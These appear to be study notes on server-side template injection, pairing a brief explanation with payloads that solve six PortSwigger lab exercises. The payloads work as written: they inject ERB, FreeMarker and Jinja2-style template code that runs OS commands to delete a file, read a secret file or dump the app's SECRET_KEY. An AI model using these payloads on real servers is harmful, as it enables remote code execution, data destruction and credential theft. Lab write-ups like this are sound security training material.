# What is SSTI  
Attackers can use native template syntax to insert a malicious payload into a template, allowing it to execute on the server side.　　

Template engines are designed to generate web pages by combining static templates with dynamic data. 
SSTI (Server-Side Template Injection) can occur when user input is directly concatenated into the template rather than passed as data. 
This enables attackers to insert arbitrary template directives to manipulate the template engine, 
potentially gaining complete control over the server.




## Labs Portswigger
### 1. Basic server-side template injection
>Ruby 
```
<%= system("rm+morale.txt") %>
```

### 2. Basic server-side template injection (code context)
```
blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
```

### 3. Server-side template injection using documentation
>Java Freemaker
```
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

### 4. Server-side template injection in an unknown language with a documented exploit
>NodeJS Handlebars exploit
>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs


### 5. Server-side template injection with information disclosure via user-supplied objects
>Python Jinja2
```
{{settings.SECRET_KEY}}
```


### 6. Admin panel Password Reset Email SSTI
>Jinja2  

![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)  
```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
